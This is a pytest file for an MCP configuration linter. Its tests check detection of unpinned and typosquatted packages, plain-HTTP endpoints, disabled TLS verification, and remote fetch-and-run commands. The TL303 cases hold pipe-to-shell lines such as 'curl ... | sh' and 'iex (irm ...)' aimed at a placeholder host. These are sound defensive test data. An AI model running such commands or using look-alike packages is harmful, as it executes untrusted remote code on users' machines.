from __future__ import annotations

import pytest

from tests.conftest import codes, lint, server

# ---------------------------------------------------------------- TL301


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "@modelcontextprotocol/server-github"]),
        ("npx", ["@playwright/mcp@latest"]),
        ("npx", ["-y", "some-mcp@^1.2.0"]),
        ("bunx", ["some-mcp"]),
        ("pnpm", ["dlx", "some-mcp"]),
        ("npm", ["exec", "--yes", "some-mcp"]),
        ("npx", ["-y", "--package", "some-mcp", "some-bin"]),
        ("uvx", ["mcp-server-fetch"]),
        ("uvx", ["mcp-server-fetch>=2025.1"]),
        ("uvx", ["--from", "git+https://github.com/acme/x", "x"]),
        ("pipx", ["run", "some-mcp"]),
        ("uv", ["tool", "run", "some-mcp"]),
        ("docker", ["run", "-i", "--rm", "mcp/git"]),
        ("docker", ["run", "-i", "mcp/git:latest"]),
        ("cmd", ["/c", "npx", "-y", "some-mcp"]),
        ("bash", ["-c", "npx -y some-mcp --stdio"]),
        ("npx -y some-mcp", []),
    ],
)
def test_tl301_unpinned(command: str, args: list[str]) -> None:
    assert "TL301" in codes(lint(server(command=command, args=args), select=["TL301"]))


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "@modelcontextprotocol/server-github@2025.4.8"]),
        ("npx", ["@playwright/mcp@0.0.41", "--headless"]),
        ("npx", ["-y", "--package", "some-mcp@1.0.0", "some-bin"]),
        ("uvx", ["mcp-server-fetch==2025.4.7"]),
        ("uvx", ["mcp-server-fetch@2025.4.7"]),
        ("uvx", ["--from", "markitdown-mcp==0.0.1a4", "markitdown-mcp"]),
        ("uvx", ["--from", "git+https://github.com/acme/x@" + "a" * 40, "x"]),
        ("docker", ["run", "-i", "--rm", "-e", "TOKEN", "mcp/git:1.2.0"]),
        ("docker", ["run", "-i", "mcp/git@sha256:" + "b" * 64]),
        ("node", ["/opt/mcp/server.js"]),
        ("python", ["-m", "my_server"]),
        ("/usr/local/bin/my-mcp", ["--stdio"]),
    ],
)
def test_tl301_pinned_or_local(command: str, args: list[str]) -> None:
    assert lint(server(command=command, args=args), select=["TL301"]) == []


def test_tl301_location_points_at_package_arg() -> None:
    f = lint(server(command="npx", args=["-y", "some-mcp"]), select=["TL301"])
    assert f[0].location.json_path == "$.mcpServers.srv.args[1]"


# ---------------------------------------------------------------- TL302


@pytest.mark.parametrize(
    ("command", "args", "target"),
    [
        ("npx", ["-y", "@modelcontextprotocol/server-filesytem@1.0.0"], "@modelcontextprotocol/server-filesystem"),
        ("npx", ["-y", "@modelcontextprotocoI/server-memory@1.0.0"], "@modelcontextprotocol/server-memory"),
        ("npx", ["@playwrlght/mcp@0.0.41"], "@playwright/mcp"),
        ("uvx", ["mcp-server-fetsh==1.0.0"], "mcp-server-fetch"),
        ("npx", ["-y", "firecrawl-mcpp@1.0.0"], "firecrawl-mcp"),
        ("npx", ["-y", "@model-context-protocol/server-github@1.0.0"], "@modelcontextprotocol/server-github"),
    ],
)
def test_tl302_typosquats(command: str, args: list[str], target: str) -> None:
    f = lint(server(command=command, args=args), select=["TL302"])
    assert f and target in f[0].message


@pytest.mark.parametrize(
    "pkg",
    [
        "@modelcontextprotocol/server-filesystem@2025.8.21",
        "@modelcontextprotocol/server-github@2025.4.8",
        "@playwright/mcp@0.0.41",
        "mcp-remote@0.1.29",
        "@acme/internal-tools@1.0.0",
        "left-pad@1.3.0",
    ],
)
def test_tl302_negatives(pkg: str) -> None:
    assert lint(server(command="npx", args=["-y", pkg]), select=["TL302"]) == []


def test_tl302_extra_popular_packages() -> None:
    from toollint.config import Config

    cfg = Config(extra_popular_packages=["npm:@acme/mcp-server-billing"])
    f = lint(server(command="npx", args=["-y", "@acme/mcp-server-biling@1.0.0"]), config=cfg, select=["TL302"])
    assert f


def test_popular_list_does_not_flag_itself() -> None:
    from toollint.rules.supply_chain import bundled_popular_packages, typosquat_candidates

    popular = bundled_popular_packages()
    assert len(popular) >= 50
    for eco, name in popular:
        assert typosquat_candidates(eco, name, popular) is None, name


# ---------------------------------------------------------------- TL303


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("bash", ["-c", "curl -fsSL https://x.example/install.sh | sh"]),
        ("sh", ["-c", "wget -qO- https://x.example/i.sh | sudo bash"]),
        ("bash", ["-c", 'bash -c "$(curl -fsSL https://x.example/i.sh)"']),
        ("bash", ["-c", "bash <(curl -s https://x.example/i.sh)"]),
        ("powershell", ["-Command", "iex (irm https://x.example/i.ps1)"]),
        ("deno", ["run", "-A", "https://x.example/server.ts"]),
        ("python3", ["https://x.example/server.py"]),
    ],
)
def test_tl303_positives(command: str, args: list[str]) -> None:
    f = lint(server(command=command, args=args), select=["TL303"])
    assert f and f[0].severity.value == "critical"


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("bash", ["-c", "source ~/.venv/bin/activate && my-mcp"]),
        ("node", ["server.js", "--endpoint", "https://api.example/v1"]),
        ("curl", ["--version"]),
        ("deno", ["run", "--allow-net", "./server.ts"]),
    ],
)
def test_tl303_negatives(command: str, args: list[str]) -> None:
    assert lint(server(command=command, args=args), select=["TL303"]) == []


# ---------------------------------------------------------------- TL304


def test_tl304_plain_http_url() -> None:
    f = lint({"mcpServers": {"x": {"url": "http://mcp.example/sse"}}}, select=["TL304"])
    assert f and f[0].severity.value == "medium"


def test_tl304_with_credentials_is_high() -> None:
    doc = {
        "servers": {
            "x": {"type": "http", "url": "http://mcp.example/mcp", "headers": {"Authorization": "Bearer ${input:t}"}}
        }
    }
    f = lint(doc, select=["TL304"])
    assert f and f[0].severity.value == "high"


def test_tl304_bridge_argument() -> None:
    assert lint(server(command="npx", args=["-y", "mcp-remote@0.1.29", "http://mcp.example/sse"]), select=["TL304"])


@pytest.mark.parametrize(
    "url",
    [
        "https://mcp.example/sse",
        "http://localhost:3000/mcp",
        "http://127.0.0.1:8080",
        "http://[::1]:9000/mcp",
        "http://app.localhost/mcp",
    ],
)
def test_tl304_negatives(url: str) -> None:
    assert lint({"mcpServers": {"x": {"url": url}}}, select=["TL304"]) == []


# ---------------------------------------------------------------- TL305


@pytest.mark.parametrize(
    "env",
    [
        {"NODE_TLS_REJECT_UNAUTHORIZED": "0"},
        {"PYTHONHTTPSVERIFY": "0"},
        {"GIT_SSL_NO_VERIFY": "true"},
        {"PIP_TRUSTED_HOST": "pypi.example"},
    ],
)
def test_tl305_env(env: dict[str, str]) -> None:
    assert lint(server(command="x", env=env), select=["TL305"])


@pytest.mark.parametrize(
    "arg", ["--insecure", "--trusted-host=pypi.example", "--allow-insecure-host", "--ignore-certificate-errors"]
)
def test_tl305_args(arg: str) -> None:
    assert lint(server(command="x", args=[arg]), select=["TL305"])


def test_tl305_negatives() -> None:
    env = {"NODE_TLS_REJECT_UNAUTHORIZED": "1", "NODE_EXTRA_CA_CERTS": "/etc/ssl/corp.pem"}
    assert lint(server(command="x", args=["--secure"], env=env), select=["TL305"]) == []
